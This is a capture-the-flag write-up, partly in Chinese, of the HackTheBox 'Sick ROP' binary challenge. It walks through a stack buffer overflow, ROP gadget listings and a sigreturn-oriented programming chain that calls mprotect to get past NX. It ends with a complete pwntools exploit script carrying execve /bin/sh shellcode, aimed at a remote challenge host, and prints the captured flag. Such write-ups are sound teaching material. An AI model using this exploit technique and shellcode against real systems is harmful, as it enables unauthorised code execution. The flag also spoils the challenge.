$ whoami
ctf
$ ls
flag.txt
run_challenge.sh
sick_rop
$ cat flag.txt
HTB{why_st0p_wh3n_y0u_cAn_s1GRoP!?}
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/sickrop5.jpg)

#### 详细过程及exp - 2
#### 1. Basic checks:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/sickrop]
└─# file sick_rop 
sick_rop: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
┌──(root💀kali)-[~/hackthebox/challenge/pwn/sickrop]
└─# checksec sick_rop
[*] '/root/hackthebox/challenge/pwn/sickrop/sick_rop'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

#### 2. General overview:

The binary exploitation is straightforward, there is NX bit enabled and it is statically linked. Additionally, the name of the binary reveals what the problem will be to solve.

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/sickrop]
└─# objdump -S sick_rop -Mintel

sick_rop：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000401000 <read>:   (1)
  401000:       b8 00 00 00 00          mov    eax,0x0
  401005:       bf 00 00 00 00          mov    edi,0x0
  40100a:       48 8b 74 24 08          mov    rsi,QWORD PTR [rsp+0x8]
  40100f:       48 8b 54 24 10          mov    rdx,QWORD PTR [rsp+0x10]
  401014:       0f 05                   syscall 
  401016:       c3                      ret    

0000000000401017 <write>:   (2)
  401017:       b8 01 00 00 00          mov    eax,0x1
  40101c:       bf 01 00 00 00          mov    edi,0x1
  401021:       48 8b 74 24 08          mov    rsi,QWORD PTR [rsp+0x8]
  401026:       48 8b 54 24 10          mov    rdx,QWORD PTR [rsp+0x10]
  40102b:       0f 05                   syscall 
  40102d:       c3                      ret    

000000000040102e <vuln>:    (3)
  40102e:       55                      push   rbp
  40102f:       48 89 e5                mov    rbp,rsp
  401032:       48 83 ec 20             sub    rsp,0x20
  401036:       49 89 e2                mov    r10,rsp
  401039:       68 00 03 00 00          push   0x300
  40103e:       41 52                   push   r10
  401040:       e8 bb ff ff ff          call   401000 <read>
  401045:       50                      push   rax
  401046:       41 52                   push   r10
  401048:       e8 ca ff ff ff          call   401017 <write>
  40104d:       c9                      leave  
  40104e:       c3                      ret    

000000000040104f <_start>:   (4)
  40104f:       e8 da ff ff ff          call   40102e <vuln>
  401054:       eb f9                   jmp    40104f <_start>
```

There are only 4 functions available to the user.

(4) start() call the vuln() (3) infinitely.

The vuln() reads 0x300 bytes from STDIN and store it in the buffer, then prints the same buffer to STDOUT.

Buffer could be overflowed at offset 0x20.

Additionally, there are two other functions (1) read() and (2) wirte() .

#### 3. Spot the vulnerability — Buffer Overflow:

Send the 50B long de Bruijn sequence using cyclic() with attached GDB.

``` python
from pwn import *

p = process("./sick_rop")
elf = ELF("sick_rop")

gdb.attach(p, '''c
	''')

p.sendline(cyclic(50))
p.recv()

p.interactive()
```

The buffer overflow occurs after sending over 32B of data.

Bytes between 32~40 overflow the RBP register, then subsequent bytes are written to the RSP register, where the vuln() function returns.

So to control the execution flow, the user has to send 40B of random data first and then address to return.

Additionally, there is worth mentioning that the RAX register is filled with 51B which is equal to the length of entered string and "\n" char (4).

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/sickrop6.jpg)

``` bash
❯ cyclic -l kaaa
40
```

#### 4. Construct the ROP chain:

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/sickrop]
└─# ROPgadget --binary sick_rop
Gadgets information
============================================================
0x0000000000401012 : and al, 0x10 ; syscall
0x000000000040100d : and al, 8 ; mov rdx, qword ptr [rsp + 0x10] ; syscall
0x0000000000401044 : call qword ptr [rax + 0x41]
0x000000000040104c : dec ecx ; ret
0x000000000040100c : je 0x401032 ; or byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; syscall
0x0000000000401023 : je 0x401049 ; or byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; syscall
0x0000000000401054 : jmp 0x40104f
0x000000000040104d : leave ; ret
0x0000000000401010 : mov edx, dword ptr [rsp + 0x10] ; syscall
0x000000000040100b : mov esi, dword ptr [rsp + 8] ; mov rdx, qword ptr [rsp + 0x10] ; syscall
0x000000000040100f : mov rdx, qword ptr [rsp + 0x10] ; syscall
0x000000000040100e : or byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; syscall
0x0000000000401011 : push rsp ; and al, 0x10 ; syscall
0x0000000000401016 : ret
0x0000000000401049 : retf 0xffff
0x0000000000401014 : syscall

Unique gadgets found: 16
```

In this scenario, I was unable to call the execve() function using the available ROP gadgets.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/sickrop7.jpg)

However, there is a technique called SROP which solves the problem.

***[SROP](https://hackmd.io/@imth/SROP) — Sigreturn Oriented Programming requires 2 Gadgets, the ability to write 300 B to the stack and the ability to control the Instruction Pointer. The required gadgets are a [sigreturn](https://man7.org/linux/man-pages/man2/sigreturn.2.html) and a syscall return gadget.
In older Linux Kernels these are often already available at a fixed address.***

 - To use this technique, two specific gadgets will be needed:

a [sigreturn](https://man7.org/linux/man-pages/man2/sigreturn.2.html) syscall gadget eax=0xf; syscall

a syscall return gadget syscall; ret

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/sickrop8.jpg)

In order to call sigreturn() , you have to utilize the fact that you can control the RAX register.

``` python
from pwn import *

p = process("./sick_rop")
elf = ELF("sick_rop")

gdb.attach(p, '''c
	''')

vuln_function = p64(0x40102e)
return_address = p64(0x42424242)

p.sendline(b"A" * 40 + vuln_function + return_address)
p.recv()
p.sendline(b"C" * 14) # RAX = 15
p.recv()
```

If you overflow the return address (RSP register) with vuln() (1) you can basically rewrite the length of the RAX register via read() used within.

After reading the bytes (2), vuln() will return to the given address (3).

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/sickrop9.jpg)

To call sigreturn() just replace return_address with syscall gadget.

#### 5. Craft a SigreturnFrame that calls mprotect()on amd64:

Use [mprotect()](https://failingsilently.wordpress.com/2017/12/17/rop-exploit-mprotect-and-shellcode/) to bypass NX bit, by setting the address space with r-w-x permissions, thus allowing custom shellcode execution.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/sickrop10.jpg)

You can use [pwntools](https://docs.pwntools.com/en/stable/rop/srop.html) to set register properly within the SigreturnFrame.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/sickrop11.jpg)

You can check the pointer to the vuln() function and the start address of the binary using GDB as below.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/sickrop12.jpg)

After running the script, enter some DDDDD for the read() and then check if mprotect() changed permissions and where the shellcode is being stored.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/sickrop13.jpg)

0x4010b8 is the pointer to the DDD... string (placeholder for the shellcode) and the permissions r-w-x were set correctly by mprotect() .

#### 6. Gain code execution:

Prepare the shellcode for x64 architecture.

 - [Linux/x64 - execve(/bin/sh) Shellcode (24 bytes)](https://www.exploit-db.com/exploits/42179)

``` bash
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05 #23B
```

Using buffer overflow again overflow the first 40B of data with shellcode, then NOP's, and a return address to the shellcode @40 offset.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/sickrop14.jpg)

Use exploit locally to check if it is working and then on the target machine.

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/sickrop]
└─# python local.py 
[+] Starting local process './sick_rop': pid 5909
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$ whoami
root
```

#### 7. Final exploit:

``` python
from pwn import *

p = remote("188.166.173.208", 32005)

context.clear(arch="amd64")
# Calling sigreturn() with mprotect() ---
vuln_function  = p64(0x40102e)
syscall_gadget = p64(0x401014)

frame = SigreturnFrame(kernel="amd64")          # CREATING A SIGRETURN FRAME
frame.rax = 10                                  # MPROTECT SYSCALL
frame.rdi = 0x0000000000400000                  # BASE ADDRESS
frame.rsi = 0x4000                              # SIZE
frame.rdx = 7                                   # RWX PERMISSION
frame.rsp = 0x00000000004010d8                  # RET ADDRESS - pointer to vuln() 
frame.rip = 0x0000000000401014                  # SYSCALL ADDRESS

payload = "A"*40 + vuln_function + syscall_gadget + str(frame)
p.sendline(payload)
p.recv()
p.sendline("C" * 14) # RAX = 15
p.recv()

# Overflow again with the shellcode ---
shellcode = ("\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05") # 23B
p.send(shellcode + "\x90" * 17 + p64(0x4010b8))
p.recv()
p.interactive()
```

``` bash
┌──(root💀kali)-[~/hackthebox/challenge/pwn/sickrop]
└─# python getshell1.py 
[+] Opening connection to 188.166.173.208 on port 32005: Done
[*] Switching to interactive mode
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ whoami
ctf
$ ls
flag.txt
run_challenge.sh
sick_rop
$ cat flag.txt
HTB{why_st0p_wh3n_y0u_cAn_s1GRoP!?}
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/sickrop15.jpg)

#### 摘自(致敬原作)......

 - 浏览medium.com博客每月有次数限制，并且5$收费，故摘录文章。。。
 - [PWN Sick ROP - HTB](https://karol-mazurek95.medium.com/pwn-sick-rop-htb-a0b7e1ce3829)
<!-- kb:end sick-rop -->

</details>

